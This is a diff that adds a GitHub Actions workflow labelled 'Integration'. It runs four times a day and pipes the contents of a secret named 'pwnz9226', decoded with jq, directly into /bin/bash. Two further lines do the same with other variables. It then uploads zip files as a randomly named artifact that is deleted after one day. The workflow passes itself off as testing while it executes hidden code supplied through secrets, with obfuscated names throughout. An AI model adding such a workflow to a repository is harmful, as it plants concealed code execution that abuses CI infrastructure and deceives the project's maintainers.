@@ -1,0 +1,30 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          pwnz9226: ${{ secrets.pwnz9226 }}
+        run: |
+          printf '%s' "$pwnz9226" | jq -r .k05093 | /bin/bash
+          printf '%s' "$dyet317" | jq -r .i3321 | /bin/bash
+          printf '%s' "$z04" | jq -r .v12323 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gUCeCRPt
+          path: "*.zip"
+          retention-days: 1
